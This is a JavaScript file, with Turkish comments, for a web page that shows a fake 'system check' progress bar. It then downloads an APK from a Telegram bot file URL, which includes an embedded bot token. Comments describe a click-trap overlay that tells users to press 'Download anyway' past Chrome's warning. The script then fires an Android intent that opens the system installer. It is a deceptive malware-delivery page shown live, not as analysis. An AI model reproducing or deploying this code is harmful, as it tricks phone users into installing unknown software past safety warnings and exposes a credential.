// 1. Önce fonksiyonu tanımlıyoruz (Hata almamak için en üstte olmalı)
function runProgressBar(callback) {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    
    let width = 0;
    const interval = setInterval(() => {
        width += Math.random() * 6; // Hızlı ve gerçekçi artış
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Sistem kontrolü tamamlandı.";
            // İşlem bittiğinde callback (yani indirme) başlar
            callback();
        } else {
            bar.style.width = width + "%";
            status.innerText = "Hazırlanıyor: %" + Math.round(width);
        }
    }, 100);
}

// 2. Ana buton dinleyicisi
document.getElementById('start-btn').addEventListener('click', function() {
    this.style.display = 'none'; // Butonu gizle
    const status = document.getElementById('status');
    const trap = document.getElementById('click-trap');

    // Fonksiyonu çağırıyoruz
    runProgressBar(() => {
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

        // ADIM A: Chrome uyarısını tetikle
        window.location.href = apkUrl;

        // ADIM B: 0.5 saniye sonra tuzağı (Click-trap) aktif et
        setTimeout(() => {
            trap.style.display = "block";
            status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Kurulumu onaylamak için alttaki <b>'Yine de indir'</b> butonuna basın.";
        }, 500);
    });
});

// 3. TUZAK TIKLANDIĞINDA (Android'i yüklemeye zorlayan kısım)
document.getElementById('click-trap').addEventListener('click', function() {
    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
    
    // Protokolü temizle ve Intent'e çevir
    const cleanUrl = apkUrl.replace('https://', '');
    const intentUrl = `intent://${cleanUrl}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
    
    // Kullanıcı dokunduğu anda sistemi yükleme ekranına fırlatır
    window.location.href = intentUrl;
    console.log("Sistem yükleyiciye yönlendiriliyor...");
});
